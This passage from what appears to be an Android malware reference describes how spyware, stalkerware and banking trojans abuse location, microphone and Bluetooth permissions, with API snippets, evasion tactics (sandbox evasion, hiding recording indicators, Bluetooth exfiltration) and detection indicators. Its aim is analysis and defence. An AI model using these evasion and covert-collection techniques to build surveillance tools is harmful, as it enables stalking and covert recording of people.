the background location grant rate.</p> <p>Android 11 (API 30): Auto-revoke (hibernation) introduced. If the app is not used for several months, all permissions including background location are automatically revoked. Malware that hides its launcher icon may still have its permissions revoked.</p> <p>Android 12 (API 31): The approximate location toggle compounds the restriction. Even if background location is granted, the user may have selected approximate only, limiting background updates to coarse accuracy.</p> <p>Android 13 (API 33): Foreground service type enforcement tightened. Apps declaring <code>foregroundServiceType=\"location\"</code> must hold <code>ACCESS_FINE_LOCATION</code> or <code>ACCESS_COARSE_LOCATION</code>. This does not replace <code>ACCESS_BACKGROUND_LOCATION</code> but affects the foreground service workaround.</p> <p>Android 14 (API 34): Foreground service types are now mandatory. Apps must declare <code>foregroundServiceType</code> in the manifest and hold the corresponding permissions at runtime. The <code>location</code> type requires active location permissions.</p>"},{"location":"permissions/location/access-background-location/#workarounds-when-background-location-is-denied","title":"Workarounds When Background Location Is Denied","text":"Technique Mechanism Limitations Foreground service with notification Declare <code>foregroundServiceType=\"location\"</code> with a persistent notification Visible to user, can be dismissed on Android 13+ WorkManager periodic tasks Schedule recurring work that reads <code>getLastKnownLocation()</code> Subject to battery optimization, may get stale location AlarmManager + <code>setExactAndAllowWhileIdle()</code> Wake the app at exact intervals to grab location Doze mode limits frequency, gets killed quickly Push notification trigger FCM message triggers location read in message handler Brief execution window, unreliable for continuous tracking Companion device pairing Use <code>CompanionDeviceManager</code> to exempt from background restrictions Requires user interaction, device pairing step Accessibility service abuse Read location from other apps' UI or maintain process priority Requires accessibility grant, heavily scrutinized"},{"location":"permissions/location/access-background-location/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACCESS_BACKGROUND_LOCATION\" /&gt;\n</code></pre> <p>The presence of <code>ACCESS_BACKGROUND_LOCATION</code> in any app that is not a navigation, fitness tracking, or family safety app is a strong red flag.</p> <p>Key indicators during analysis:</p> Signal What to Look For Manifest <code>ACCESS_BACKGROUND_LOCATION</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>INTERNET</code> PendingIntent registration <code>requestLocationUpdates()</code> with <code>PendingIntent</code> instead of <code>LocationCallback</code> Geofence setup <code>addGeofences()</code> calls, especially with coordinates matching country boundaries Database storage Local SQLite tables storing latitude, longitude, timestamp, accuracy columns Service declarations <code>foregroundServiceType=\"location\"</code> combined with minimal or deceptive notification text Boot receiver <code>BroadcastReceiver</code> for <code>BOOT_COMPLETED</code> that re-registers location requests <p>Apps that request background location but have no visible mapping, navigation, or fitness UI are almost certainly collecting location for exfiltration. Cross-reference the requested permissions with the app's declared functionality to identify the mismatch.</p>"},{"location":"permissions/location/access-coarse-location/","title":"ACCESS_COARSE_LOCATION","text":"<p>Grants network-based approximate location with roughly 1-2km accuracy using WiFi access points and cell tower data. Less useful than fine location for stalkerware but sufficient for country/city-level victim profiling, geofenced payload activation, and sandbox evasion.</p>"},{"location":"permissions/location/access-coarse-location/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACCESS_COARSE_LOCATION</code> Protection Level <code>dangerous</code> Permission Group <code>LOCATION</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/location/access-coarse-location/#what-it-enables","title":"What It Enables","text":"<p>Access to the network location provider (<code>LocationManager.NETWORK_PROVIDER</code>) and the fused provider at <code>PRIORITY_BALANCED_POWER_ACCURACY</code> or <code>PRIORITY_LOW_POWER</code>. Returns coordinates fuzzed to approximately a 1-2km radius around the actual position.</p> <pre><code>FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(context);\nclient.requestLocationUpdates(\n    new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 60000).build(),\n    locationCallback,\n    Looper.getMainLooper()\n);\n</code></pre> <p>With <code>ACCESS_COARSE_LOCATION</code>, an app can:</p> <ul> <li>Get network-derived position (WiFi + cell triangulation)</li> <li>Access WiFi scan results (since Android 8.1)</li> <li>Scan for BLE devices (<code>BluetoothLeScanner</code>)</li> <li>Detect nearby WiFi networks (<code>WifiManager.getScanResults()</code>)</li> <li>Use the <code>NETWORK_PROVIDER</code> in <code>LocationManager</code></li> </ul> <p>It cannot:</p> <ul> <li>Access the GPS provider directly</li> <li>Get accuracy better than approximately 1-2km through legitimate API calls</li> <li>Set up geofences (requires <code>ACCESS_FINE_LOCATION</code>)</li> </ul>"},{"location":"permissions/location/access-coarse-location/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/location/access-coarse-location/#fallback-location-strategy","title":"Fallback Location Strategy","text":"<p>Malware commonly requests both <code>ACCESS_FINE_LOCATION</code> and <code>ACCESS_COARSE_LOCATION</code>. If the user (on Android 12+) downgrades to approximate location, the malware still gets coarse data. Some families check the granted permission level and adjust their behavior, using coarse data for country-level decisions and deferring precision-dependent operations.</p>"},{"location":"permissions/location/access-coarse-location/#country-and-region-detection","title":"Country and Region Detection","text":"<p>Coarse location is sufficient for determining which country or city the victim is in. Banking trojans use this to:</p> <ul> <li>Select the right overlay injection target from their phishing kit</li> <li>Choose the correct language for social engineering prompts</li> <li>Decide whether to activate at all (avoid non-target regions)</li> <li>Report victim geography to C2 for campaign segmentation</li> </ul>"},{"location":"permissions/location/access-coarse-location/#sandbox-evasion","title":"Sandbox Evasion","text":"<p>Analysis sandboxes often return null or default coordinates (0.0, 0.0 or US-based locations). Checking for coarse location anomalies is a lightweight evasion technique. If the reported location does not match the device's MCC/MNC (mobile country/network codes from <code>TelephonyManager</code>), the malware assumes it is running in an analysis environment.</p>"},{"location":"permissions/location/access-coarse-location/#wifi-environment-fingerprinting","title":"WiFi Environment Fingerprinting","text":"<p>With <code>ACCESS_COARSE_LOCATION</code>, the app can call <code>WifiManager.getScanResults()</code> to enumerate all visible WiFi networks. This produces a fingerprint of the local RF environment:</p> <ul> <li>BSSID list reveals the physical location via public WiFi geolocation databases</li> <li>SSID names can identify corporate networks, government facilities, or specific targets</li> <li>Signal strength patterns create a unique fingerprint of the location even without coordinates</li> </ul>"},{"location":"permissions/location/access-coarse-location/#notable-families","title":"Notable Families","text":"Family Coarse Location Usage Joker Region check before activating premium SMS fraud Harly Country detection for subscription scam targeting GriftHorse Location-based selection of premium number to dial SharkBot Geographic filtering to target specific banking regions Xenomorph Coarse geofencing for overlay activation decisions"},{"location":"permissions/location/access-coarse-location/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): Became a runtime permission. Before this, manifest declaration was sufficient.</p> <p>Android 8.0 (API 26): Background apps receive coarse location updates only a few times per hour due to background execution limits.</p> <p>Android 8.1 (API 27): WiFi scan results now require either <code>ACCESS_FINE_LOCATION</code> or <code>ACCESS_COARSE_LOCATION</code>. Previously only <code>ACCESS_WIFI_STATE</code> was needed.</p> <p>Android 10 (API 29): Background location access split out into <code>ACCESS_BACKGROUND_LOCATION</code>. Coarse location alone only works while the app is in the foreground or running a foreground service.</p> <p>Android 12 (API 31): The approximate location toggle changed the dynamic significantly. Apps requesting <code>ACCESS_FINE_LOCATION</code> and <code>ACCESS_COARSE_LOCATION</code> together show a dialog with a precision toggle. The user can grant only approximate location, which means the app effectively receives coarse-level data even though it requested fine. If an app requests only <code>ACCESS_COARSE_LOCATION</code>, the dialog has no precision toggle and grants approximate by default.</p> <p>Android 12 (API 31): <code>ACCESS_COARSE_LOCATION</code> returns coordinates fuzzed to a ~1.5km radius cell. The fuzzing is consistent for a period (the same approximate location is returned for the same cell), which means temporal correlation can still reveal movement patterns at city-block granularity.</p>"},{"location":"permissions/location/access-coarse-location/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" /&gt;\n</code></pre> <p>When <code>ACCESS_COARSE_LOCATION</code> appears without <code>ACCESS_FINE_LOCATION</code>, the app either legitimately needs only approximate data or is trying to reduce its permission footprint to avoid scrutiny. Many malware families request both, so a coarse-only request is less common and may indicate a more targeted approach.</p> <p>Watch for:</p> <ul> <li><code>ACCESS_COARSE_LOCATION</code> combined with <code>TelephonyManager</code> calls (MCC/MNC checks) for region-based payload selection</li> <li>WiFi scanning patterns that enumerate all nearby access points immediately after location grant</li> <li>Location checks followed by conditional code paths that exit or self-delete based on geographic result</li> <li>Network requests to IP geolocation APIs as a secondary location source alongside coarse permission</li> </ul>"},{"location":"permissions/location/access-fine-location/","title":"ACCESS_FINE_LOCATION","text":"<p>Grants GPS-precision location access (within ~3 meters) using GPS, GLONASS, WiFi positioning, cell tower triangulation, and the fused location provider. The single most valuable permission for stalkerware and a common request in banking trojans that use geofencing to activate in target regions.</p>"},{"location":"permissions/location/access-fine-location/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACCESS_FINE_LOCATION</code> Protection Level <code>dangerous</code> Permission Group <code>LOCATION</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/location/access-fine-location/#what-it-enables","title":"What It Enables","text":"<p>Access to the <code>FusedLocationProviderClient</code> (Google Play Services) or the platform <code>LocationManager</code> for high-accuracy location updates.</p> <pre><code>FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(context);\nclient.requestLocationUpdates(\n    new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10000).build(),\n    locationCallback,\n    Looper.getMainLooper()\n);\n</code></pre> <p>Available location sources:</p> Provider Accuracy Battery Cost Notes GPS (<code>gps</code>) ~3m High Requires clear sky view, slow cold start Network (<code>network</code>) ~30-100m Low WiFi + cell tower Fused (<code>fused</code>) ~3-100m Variable Google Play Services, balances accuracy vs battery Passive (<code>passive</code>) Varies None Piggybacks on other apps' location requests <p>With <code>ACCESS_FINE_LOCATION</code>, an app can:</p> <ul> <li>Request continuous GPS updates at arbitrary intervals</li> <li>Get last known location without waiting for a fix</li> <li>Set up geofences that trigger callbacks on region entry/exit</li> <li>Access WiFi scan results (required since Android 8.1 for <code>WifiManager.getScanResults()</code>)</li> <li>Read nearby BLE beacon data for indoor positioning</li> </ul>"},{"location":"permissions/location/access-fine-location/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/location/access-fine-location/#stalkerware-and-domestic-surveillance","title":"Stalkerware and Domestic Surveillance","text":"<p>Stalkerware families poll <code>FusedLocationProviderClient</code> at intervals between 1 and 15 minutes, logging each fix with timestamp, accuracy, speed, and bearing. Logs are exfiltrated to C2 or stored locally for later retrieval. Some families (FlexiSPY, mSpy, Cerberus) offer real-time location streaming to the operator's dashboard.</p>"},{"location":"permissions/location/access-fine-location/#geofenced-banking-trojans","title":"Geofenced Banking Trojans","text":"<p>Banking trojans like Anubis, Alien, and Ermac request fine location to determine if the device is in a target country. If the coordinates fall outside the target zone, the malware either stays dormant or uninstalls itself. This defeats sandbox analysis since emulators and analysis environments typically report default or US-based coordinates.</p> <pre><code>Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);\nif (loc != null &amp;&amp; isTargetCountry(loc.getLatitude(), loc.getLongitude())) {\n    activateOverlayAttacks();\n}\n</code></pre>"},{"location":"permissions/location/access-fine-location/#tracking-for-physical-operations","title":"Tracking for Physical Operations","text":"<p>Nation-state implants (FinFisher, Pegasus) use fine location to track the physical movements of targets. Location history combined with other sensor data (accelerometer, barometer) can reveal building floor, transportation mode, and whether the target is stationary or moving.</p>"},{"location":"permissions/location/access-fine-location/#notable-families","title":"Notable Families","text":"Family Location Usage Pegasus (NSO Group) Continuous GPS tracking, location history exfiltration Cerberus Real-time location streaming, geofenced activation Anubis Geofencing to avoid non-target regions and sandboxes FlexiSPY GPS polling with configurable intervals, route logging FurBall (APT-C-50) Periodic location collection for surveillance campaigns Hermit (RCS Lab) High-frequency location sampling tied to C2 tasking LightSpy Dedicated location plugin with configurable polling intervals EagleMsgSpy Real-time GPS tracking for law enforcement surveillance BoneSpy Location collection as part of Gamaredon-linked mobile surveillance PlainGnome GPS tracking in second-stage payload for targeted espionage GuardZoo Military GPS tracking, exfiltrates location data from armed forces personnel KoSpy Periodic location harvesting for North Korean intelligence collection AridSpy Location tracking in multi-stage spyware targeting Middle Eastern users"},{"location":"permissions/location/access-fine-location/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): Location became a runtime permission. Prior to this, declaring it in the manifest was sufficient. Granting <code>ACCESS_FINE_LOCATION</code> implicitly granted <code>ACCESS_COARSE_LOCATION</code> (same permission group behavior).</p> <p>Android 8.0 (API 26): Background location throttled. Apps in the background receive location updates only a few times per hour. Foreground services bypass this throttle.</p> <p>Android 8.1 (API 27): <code>WifiManager.getScanResults()</code> now requires <code>ACCESS_FINE_LOCATION</code> or <code>ACCESS_COARSE_LOCATION</code> in addition to <code>ACCESS_WIFI_STATE</code>. WiFi-based location became tied to location permissions.</p> <p>Android 10 (API 29): Background location split into <code>ACCESS_BACKGROUND_LOCATION</code>. Apps targeting API 29+ must request it separately. Foreground-only location is the default. The permission dialog offers \"Allow all the time\" only if background location is also requested.</p> <p>Android 11 (API 30): Incremental location grants. The system forces a two-step flow: foreground first, then background via Settings. <code>ACCESS_BACKGROUND_LOCATION</code> cannot be requested alongside foreground permissions in the same dialog.</p> <p>Android 12 (API 31): Approximate location toggle. When an app requests <code>ACCESS_FINE_LOCATION</code>, the user can downgrade to approximate only. The system returns a location fuzzed to ~1.5km. Apps must request both <code>ACCESS_FINE_LOCATION</code> and <code>ACCESS_COARSE_LOCATION</code> to show the precision toggle. If only fine is requested, the system may deny entirely.</p> <p>Android 12 (API 31): New <code>currentLocation()</code> API as a one-shot alternative to <code>requestLocationUpdates()</code>. Intended to reduce persistent location access, but malware can still call it repeatedly.</p>"},{"location":"permissions/location/access-fine-location/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" /&gt;\n</code></pre> <p>High-risk combinations:</p> Combination Indicates <code>ACCESS_FINE_LOCATION</code> + <code>ACCESS_BACKGROUND_LOCATION</code> + <code>INTERNET</code> Continuous location exfiltration <code>ACCESS_FINE_LOCATION</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> Persistent tracking surviving reboot <code>ACCESS_FINE_LOCATION</code> + <code>CAMERA</code> + <code>RECORD_AUDIO</code> + <code>READ_SMS</code> Full surveillance suite (stalkerware) <code>ACCESS_FINE_LOCATION</code> alone with overlay permissions Banking trojan with geofencing <p>In dynamic analysis, watch for <code>requestLocationUpdates()</code> calls with high frequency intervals (under 60 seconds) and <code>addGeofences()</code> calls that define regions matching known target countries.</p>"},{"location":"permissions/microphone/","title":"Microphone Permissions","text":"<p>Microphone access enables audio capture from the device's built-in microphones. In offensive use, this means ambient room recording, call recording, and environmental audio surveillance. The microphone is one of the highest-value collection targets in spyware because audio capture provides conversational content, environmental context, and biometric voiceprints.</p> <p>Every major commercial spyware platform (Pegasus, Predator, FinFisher) implements ambient audio recording. Stalkerware treats it as a core feature alongside location tracking and camera capture.</p>"},{"location":"permissions/microphone/#permissions","title":"Permissions","text":"Permission Abuse Potential RECORD_AUDIO Ambient recording, call recording, voice surveillance, environmental monitoring"},{"location":"permissions/microphone/#key-considerations","title":"Key Considerations","text":"<p>Like the camera group, the microphone group contains a single runtime permission. Effective abuse requires combining it with other capabilities:</p> Combo Purpose <code>RECORD_AUDIO</code> + <code>CAMERA</code> Video with audio surveillance <code>RECORD_AUDIO</code> + <code>READ_PHONE_STATE</code> Trigger recording on incoming/outgoing calls <code>RECORD_AUDIO</code> + <code>INTERNET</code> Real-time audio streaming or recorded file exfiltration <code>RECORD_AUDIO</code> + <code>FOREGROUND_SERVICE</code> (type <code>microphone</code>) Sustained recording from background (Android 14+) <code>RECORD_AUDIO</code> + <code>CAPTURE_AUDIO_OUTPUT</code> (system only) Record other apps' audio output including call audio"},{"location":"permissions/microphone/#covert-recording-techniques","title":"Covert Recording Techniques","text":"<p>Silent audio capture has fewer constraints than camera capture since there is no preview surface requirement. The main challenges are:</p> <ul> <li>Background execution: maintaining a recording session while the app is not in the foreground requires a foreground service, which shows a persistent notification</li> <li>Audio indicators: Android 12+ shows an orange dot when the microphone is active</li> <li>Power consumption: continuous recording drains battery noticeably</li> <li>Storage: raw audio generates significant data; malware compresses to opus/amr-nb before exfiltration</li> </ul> <p>Malware addresses the foreground service notification by using a minimal or misleading notification (e.g., \"Updating...\"), or by leveraging accessibility to dismiss the notification. On rooted devices, the foreground service requirement can be bypassed entirely.</p>"},{"location":"permissions/microphone/record-audio/","title":"RECORD_AUDIO","text":"<p>Grants access to the device microphone for audio capture. Used by spyware for ambient room recording, call recording, and environmental surveillance. Captures conversations, meetings, phone calls, and any sound within microphone range. A primary collection capability in both state-sponsored spyware and commercial stalkerware.</p>"},{"location":"permissions/microphone/record-audio/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECORD_AUDIO</code> Protection Level <code>dangerous</code> Permission Group <code>MICROPHONE</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/microphone/record-audio/#what-it-enables","title":"What It Enables","text":""},{"location":"permissions/microphone/record-audio/#mediarecorder","title":"MediaRecorder","text":"<pre><code>MediaRecorder recorder = new MediaRecorder();\nrecorder.setAudioSource(MediaRecorder.AudioSource.MIC);\nrecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);\nrecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);\nrecorder.setOutputFile(outputPath);\nrecorder.prepare();\nrecorder.start();\n</code></pre> <p>Writes compressed audio directly to a file. Simplest approach but limited configuration.</p>"},{"location":"permissions/microphone/record-audio/#audiorecord","title":"AudioRecord","text":"<pre><code>int bufferSize = AudioRecord.getMinBufferSize(44100,\n    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);\nAudioRecord recorder = new AudioRecord(MediaRecorder.AudioSource.MIC,\n    44100, AudioFormat.CHANNEL_IN_MONO,\n    AudioFormat.ENCODING_PCM_16BIT, bufferSize);\nrecorder.startRecording();\n</code></pre> <p>Raw PCM access. Malware uses this for real-time audio streaming to C2 or for applying custom compression before storage.</p>"},{"location":"permissions/microphone/record-audio/#audio-sources","title":"Audio Sources","text":"Source Constant Captures <code>MIC</code> 1 Default microphone input <code>VOICE_UPLINK</code> 2 Outgoing call audio (restricted) <code>VOICE_DOWNLINK</code> 3 Incoming call audio (restricted) <code>VOICE_CALL</code> 4 Both sides of a call (restricted) <code>CAMCORDER</code> 5 Microphone optimized for video recording <code>VOICE_RECOGNITION</code> 6 Tuned for speech recognition <code>VOICE_COMMUNICATION</code> 7 Tuned for VoIP with echo cancellation <code>UNPROCESSED</code> 9 Raw, unprocessed audio (API 24+) <p><code>VOICE_UPLINK</code>, <code>VOICE_DOWNLINK</code>, and <code>VOICE_CALL</code> are restricted to system apps since Android 9. Third-party apps cannot directly record call audio through these sources.</p>"},{"location":"permissions/microphone/record-audio/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/microphone/record-audio/#ambient-room-recording","title":"Ambient Room Recording","text":"<p>The primary abuse case. Malware activates the microphone on schedule or on C2 command and records the surrounding environment. Captures conversations, meetings, and any audio within range.</p> <p>Typical implementation:</p> <ol> <li>C2 sends record command with duration</li> <li>Foreground service starts with minimal notification</li> <li><code>AudioRecord</code> captures raw PCM at 8kHz mono (minimizes file size)</li> <li>Audio encoded to AMR-NB or Opus for compression (8kHz AMR-NB produces roughly 1KB/second)</li> <li>Compressed file exfiltrated to C2</li> <li>Local file deleted</li> </ol> <p>Some families stream audio in real-time over a WebSocket or TCP connection rather than recording and uploading, reducing local forensic evidence.</p>"},{"location":"permissions/microphone/record-audio/#call-recording","title":"Call Recording","text":"<p>Recording phone calls from third-party apps has been progressively restricted:</p> Android Version Call Recording Status Pre-9 <code>VOICE_CALL</code> source available to third-party apps 9 (API 28) <code>VOICE_CALL</code>, <code>VOICE_UPLINK</code>, <code>VOICE_DOWNLINK</code> restricted to system apps 10 (API 29) <code>AudioRecord</code> during calls further restricted 11+ Accessibility-based call recording blocked for non-system apps <p>Malware workarounds for call recording on modern Android:</p> <ul> <li>Speakerphone capture: if the call is on speaker, <code>AudioSource.MIC</code> captures both sides of the conversation from the room</li> <li>Root + inject into incall process: with root, malware injects into the telephony stack or audio HAL to capture call audio directly</li> <li>Accessibility audio routing: deprecated and blocked in Android 11+</li> <li>System app spoofing: on rooted devices, install as a system app in <code>/system/priv-app/</code> to access restricted audio sources</li> </ul>"},{"location":"permissions/microphone/record-audio/#voice-activity-detection","title":"Voice Activity Detection","text":"<p>Sophisticated spyware implements VAD (Voice Activity Detection) to only record when speech is detected, conserving battery and storage:</p> <ol> <li>Continuous low-power monitoring of microphone input levels</li> <li>When amplitude exceeds a speech threshold, full recording begins</li> <li>Recording stops after a silence timeout</li> <li>Only segments containing speech are exfiltrated</li> </ol> <p>This dramatically reduces the volume of data while capturing all conversations.</p>"},{"location":"permissions/microphone/record-audio/#notable-families","title":"Notable Families","text":"Family Audio Usage Pegasus Ambient recording, call recording via exploit chain, real-time streaming Predator Ambient audio capture on C2 command FinSpy Scheduled ambient recording, call recording on rooted devices Hermit Ambient recording as lawful intercept capability KoSpy Audio recording via plugin, DPRK state-sponsored AridSpy Ambient recording, exfiltrated to C2 GuardZoo Audio recording targeting military personnel SpyNote Live audio streaming, call recording. Most deployed RAT. Rafel RAT Audio recording capability across 120+ campaigns PJobRAT Audio recording targeting Taiwan military Mandrake Ambient recording with environment profiling"},{"location":"permissions/microphone/record-audio/#android-version-changes","title":"Android Version Changes","text":"<p>Android 1.0 (API 1): <code>RECORD_AUDIO</code> introduced. No runtime prompt.</p> <p>Android 6.0 (API 23): runtime permission required. User must explicitly grant.</p> <p>Android 9 (API 28): background apps cannot access the microphone. A foreground service is required. <code>VOICE_CALL</code>, <code>VOICE_UPLINK</code>, and <code>VOICE_DOWNLINK</code> audio sources restricted to system apps only.</p> <p>Android 10 (API 29): foreground service must declare type <code>microphone</code> to access audio recording. Background microphone access without a foreground service silently returns empty audio buffers.</p> <p>Android 11 (API 30): one-time permissions. Users can grant microphone access for a single session only. Permission auto-revokes when the app moves to the background. Auto-reset of permissions for unused apps introduced, revoking <code>RECORD_AUDIO</code> after months of inactivity.</p> <p>Android 12 (API 31): privacy indicators. An orange dot appears in the status bar when the microphone is active. Quick settings toggle to globally disable the microphone hardware. Even with the permission granted, the mic returns silence when the toggle is off.</p> <p>Android 14 (API 34): foreground service type <code>microphone</code> must be declared both in the manifest and in <code>ServiceInfo</code> when starting the service. Missing declaration causes <code>SecurityException</code>.</p> <p>Android 15 (API 35): expanded enforcement of foreground service types and stricter background activity launch restrictions.</p>"},{"location":"permissions/microphone/record-audio/#evasion-of-privacy-indicators","title":"Evasion of Privacy Indicators","text":"<p>The Android 12+ microphone indicator (orange dot) presents the same challenge as the camera indicator:</p> Technique Status Root + system app privileges Bypass indicator, record as system process Short burst recording Indicator appears briefly; user may not notice Record only when screen is off Indicator not visible (but still present in quick settings) Exploit audio HAL directly Device-specific, requires kernel exploit Disable indicator via ADB <code>adb shell settings put</code> can suppress (requires prior access) <p>The quick settings panel reveals the accessing app even when the indicator dot is not immediately visible, so sophisticated users can detect active recording. However, most users do not check quick settings during normal phone use.</p>"},{"location":"permissions/microphone/record-audio/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.RECORD_AUDIO\" /&gt;\n</code></pre> <p>Static analysis indicators:</p> <ul> <li><code>AudioRecord</code> or <code>MediaRecorder</code> instantiation with <code>AudioSource.MIC</code> in a <code>Service</code> rather than an <code>Activity</code></li> <li>Audio encoding to AMR-NB or Opus in code without a visible recording UI</li> <li>WebSocket or raw TCP connections carrying audio-sized payloads</li> <li><code>RECORD_AUDIO</code> + <code>INTERNET</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> combination</li> <li>Foreground service declared with type <code>microphone</code> but no user-facing audio feature in the app</li> <li>Audio file creation in app-private directories with deletion after network upload</li> </ul> <p>Runtime detection on Android 12+: the orange privacy indicator dot and the quick settings panel showing the accessing app.</p>"},{"location":"permissions/nearby-devices/","title":"Nearby Devices Permissions","text":"<p>Access to Bluetooth, Wi-Fi scanning, and Ultra-Wideband (UWB) for device discovery and communication. Introduced in Android 12 to replace the previous model where nearby device operations required location permissions.</p> <p>Security relevance: Bluetooth scanning reveals nearby devices and can be used for physical tracking. Wi-Fi scanning reveals nearby networks, which can be used for location inference. BLE beacons enable indoor tracking.</p>"},{"location":"permissions/nearby-devices/#permissions","title":"Permissions","text":"Permission Abuse Potential BLUETOOTH_SCAN Discover nearby Bluetooth devices, physical tracking via BLE beacons BLUETOOTH_ADVERTISE Broadcast BLE advertisements, impersonate devices BLUETOOTH_CONNECT Connect to paired Bluetooth devices, data exfiltration via Bluetooth NEARBY_WIFI_DEVICES Scan Wi-Fi networks, location inference from BSSID/SSID UWB_RANGING Ultra-Wideband distance measurement, precise indoor positioning"},{"location":"permissions/nearby-devices/#background","title":"Background","text":"<p>Before Android 12, Bluetooth and Wi-Fi scanning required <code>ACCESS_FINE_LOCATION</code> because scan results reveal the user's location (nearby BLE beacons, Wi-Fi BSSIDs map to known locations). Android 12 separated these into dedicated nearby device permissions, with an option to assert that the app won't derive location from scan results (<code>android:usesPermissionFlags=\"neverForLocation\"</code>).</p>"},{"location":"permissions/nearby-devices/#ble-beacon-tracking","title":"BLE Beacon Tracking","text":"<p>BLE (Bluetooth Low Energy) beacons broadcast fixed identifiers at regular intervals. A malicious app with <code>BLUETOOTH_SCAN</code> can passively collect these identifiers and correlate them with known beacon databases to determine the target's indoor location with meter-level precision:</p> <ul> <li>Retail environments deploy dense beacon networks for customer analytics -- a scanning app can map exact in-store movement</li> <li>Office buildings increasingly use BLE for access control and indoor navigation, creating a grid of trackable reference points</li> <li>Public transit systems embed BLE beacons at stations and on vehicles, enabling route reconstruction without GPS</li> <li>Custom-planted beacons -- an operator can deploy small BLE beacons (under $5 each) near a target's home, workplace, or vehicle, then detect proximity through the compromised phone app</li> </ul> <p>Unlike GPS, BLE tracking works indoors, underground, and in GPS-denied environments. It also consumes significantly less battery, making continuous scanning less likely to alert the target through unusual battery drain.</p>"},{"location":"permissions/nearby-devices/#bluetooth-exfiltration-channel","title":"Bluetooth Exfiltration Channel","text":"<p><code>BLUETOOTH_CONNECT</code> enables data exfiltration over Bluetooth as an alternative to internet-based channels. This is operationally relevant when:</p> <ul> <li>The target's network traffic is monitored by a corporate firewall or national-level DPI (deep packet inspection)</li> <li>The device has no internet connectivity (airplane mode, restricted network)</li> <li>The operator wants to avoid leaving any network-layer artifacts (DNS queries, IP connections)</li> </ul> <p>The exfiltration flow uses a nearby attacker-controlled device (phone, laptop, or Raspberry Pi) within Bluetooth range (~10m for standard BLE, up to ~100m with directional antennas). The implant establishes a Bluetooth serial connection or uses GATT (Generic Attribute Profile) to transfer collected data. This requires physical proximity, making it most practical for operations where the attacker has regular access to the target's environment -- a shared office, hotel, or regular meeting location.</p>"},{"location":"permissions/nearby-devices/#wi-fi-ssidbssid-for-indoor-positioning","title":"Wi-Fi SSID/BSSID for Indoor Positioning","text":"<p><code>NEARBY_WIFI_DEVICES</code> enables Wi-Fi network scanning that provides location data without GPS through two mechanisms:</p> <p>BSSID geolocation -- Every Wi-Fi access point broadcasts a unique BSSID (MAC address). Services like Google, Apple, and WiGLE maintain massive databases mapping BSSIDs to physical locations. A single Wi-Fi scan returning 5-10 visible BSSIDs can triangulate position to within 10-30 meters in urban areas.</p> <p>SSID fingerprinting -- The set of visible network names creates a location fingerprint. Even without a BSSID database, repeated observations of the same SSID set indicate the target is in the same location. A home network's SSID appearing in scan results confirms the target is home. A corporate SSID confirms they are at the office.</p> <p>This is why Android originally required <code>ACCESS_FINE_LOCATION</code> for Wi-Fi scanning -- the scan results are functionally equivalent to a GPS fix in populated areas.</p>"},{"location":"permissions/nearby-devices/#stalkerware-physical-proximity-via-ble","title":"Stalkerware: Physical Proximity via BLE","text":"<p>Stalkerware apps abuse <code>BLUETOOTH_SCAN</code> for a particularly invasive form of tracking -- detecting when specific Bluetooth devices are near the target's phone. The stalker registers the Bluetooth MAC addresses of devices belonging to specific people (a coworker, a friend, an ex-partner), and the stalkerware alerts whenever those devices appear in scan results.</p> <p>This enables the stalker to determine:</p> <ul> <li>Who the target is physically near, and how often</li> <li>Whether a specific person's device appears at the target's location outside expected hours</li> <li>When the target is near their own vehicle, home devices, or workplace peripherals</li> </ul> <p>Combined with continuous BLE scanning in the background, this creates a social proximity graph -- not just where the target goes, but who they are with.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/","title":"BLUETOOTH_ADVERTISE","text":"<p>Allows the device to broadcast BLE (Bluetooth Low Energy) advertisements, making it visible to nearby Bluetooth scanners. Limited abuse potential compared to scanning, but can be used for device impersonation or beacon spoofing.</p>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BLUETOOTH_ADVERTISE</code> Protection Level <code>dangerous</code> Permission Group <code>NEARBY_DEVICES</code> Grant Method Runtime permission dialog Introduced API 31 (Android 12)"},{"location":"permissions/nearby-devices/bluetooth-advertise/#what-it-enables","title":"What It Enables","text":"<p>Broadcast custom BLE advertisements:</p> <pre><code>BluetoothLeAdvertiser advertiser = BluetoothAdapter.getDefaultAdapter().getBluetoothLeAdvertiser();\nAdvertiseData data = new AdvertiseData.Builder()\n    .addServiceUuid(ParcelUuid.fromString(\"your-service-uuid\"))\n    .build();\nadvertiser.startAdvertising(settings, data, callback);\n</code></pre>"},{"location":"permissions/nearby-devices/bluetooth-advertise/#abuse-in-malware","title":"Abuse in Malware","text":"<p>No major malware families have been publicly documented abusing 